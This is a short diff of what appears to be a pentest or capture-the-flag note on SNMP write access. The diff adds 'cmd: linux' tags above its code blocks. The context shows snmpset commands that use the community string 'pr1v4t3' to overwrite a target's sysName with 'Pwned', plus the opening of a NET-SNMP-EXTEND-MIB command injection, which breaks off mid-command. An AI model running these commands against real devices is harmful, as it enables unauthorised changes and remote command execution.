@@ -5,6 +5,7 @@ SNMP application that uses the SNMP SET request to set information on a network 
 ## Commands Used
 
 ### Set a simple string value
+<!-- cmd: linux -->
 ```bash
 snmpset -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0 s "Pwned"
 ```
@@ -15,6 +16,7 @@ modified the `sysName` OID to verify write access via the `pr1v4t3` community st
 - `s` - specifies that the value being set is a string.
 
 ### Inject command via NET-SNMP-EXTEND-MIB
+<!-- cmd: linux -->
 ```bash
 snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
     'nsExtendStatus."command"'  = createAndGo \
